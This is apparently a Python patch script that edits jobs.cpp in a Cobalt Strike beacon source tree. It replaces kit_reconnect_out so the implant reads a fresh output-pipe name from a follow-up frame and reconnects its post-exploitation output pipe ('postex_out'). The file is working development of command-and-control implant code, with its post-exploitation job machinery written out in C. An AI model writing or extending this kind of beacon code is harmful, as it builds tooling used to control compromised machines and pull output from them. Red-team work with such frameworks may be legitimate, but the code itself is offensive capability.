# -*- coding: utf-8 -*-
"""fix_reconnect_frame.py - parse the follow-up frame's [z] output-pipe name
(the cna generates a NEW pipe name per asyncx2 call, so the spawn-time name
in the description is stale) and reconnect to THAT."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon"
     r"\feat-post-4.9.1\src\jobs.cpp")
s = io.open(P, encoding="utf-8").read()

old = ('static void kit_reconnect_out(psh_entry * ctrl) {\n'
       '	char * outname = strstr(ctrl->description, "|");\n'
       '	HANDLE out_h = INVALID_HANDLE_VALUE;\n'
       '	int x;\n'
       '	if (outname == NULL) {\n'
       '		return;\n'
       '	}\n'
       '	outname++;\n'
       '	for (x = 0; x < 20; x++) {\n'
       '		if (connect_pipe(outname, &out_h)) {\n'
       '			pipe_track(out_h, ctrl->pid, CALLBACK_OUTPUT,\n'
       '			           "postex_out", JOB_MODE_MESSAGE);\n'
       '			return;\n'
       '		}\n'
       '		Sleep(500);\n'
       '	}\n'
       '}')
new = ('static void kit_reconnect_out(psh_entry * ctrl, char * data, int dlen) {\n'
       '	char outname[64];\n'
       '	char * descname = strstr(ctrl->description, "|");\n'
       '	HANDLE out_h = INVALID_HANDLE_VALUE;\n'
       '	int x;\n'
       '	int n = 0;\n'
       '	/* the follow-up frame is [BE32 len][pipe str][BE32 len][wire]; the\n'
       '	 * cna generates a NEW output pipe name per asyncx2 call, so the\n'
       '	 * name we must reconnect to is the one IN THE FRAME, not the one\n'
       '	 * captured at spawn time (kept as fallback). */\n'
       '	memset(outname, 0, sizeof(outname));\n'
       '	if (data != NULL && dlen > 8) {\n'
       '		int flen = ((unsigned char)data[0] << 24) |\n'
       '		           ((unsigned char)data[1] << 16) |\n'
       '		           ((unsigned char)data[2] << 8) |\n'
       '		            (unsigned char)data[3];\n'
       '		if (flen > 1 && flen < (int)sizeof(outname) && flen <= dlen - 4) {\n'
       '			for (x = 0; x < flen && x < 62; x++) {\n'
       '				if (data[4 + x] == 0) break;\n'
       '				outname[n++] = data[4 + x];\n'
       '			}\n'
       '			outname[n] = 0;\n'
       '		}\n'
       '	}\n'
       '	if (outname[0] == 0 && descname != NULL) {\n'
       '		_snprintf(outname, sizeof(outname), "%s", descname + 1);\n'
       '	}\n'
       '	if (outname[0] == 0) {\n'
       '		return;\n'
       '	}\n'
       '	for (x = 0; x < 20; x++) {\n'
       '		if (connect_pipe(outname, &out_h)) {\n'
       '			pipe_track(out_h, ctrl->pid, CALLBACK_OUTPUT,\n'
       '			           "postex_out", JOB_MODE_MESSAGE);\n'
       '			return;\n'
       '		}\n'
       '		Sleep(500);\n'
       '	}\n'
       '}')
assert old in s, "kit_reconnect_out not found"
s = s.replace(old, new)

old2 = 'kit_reconnect_out(temp);'
assert s.count(old2) == 2
s = s.replace(old2, 'kit_reconnect_out(temp, data, dlen);')

io.open(P, "w", encoding="utf-8", newline="").write(s)
print("frame-name reconnect wired")
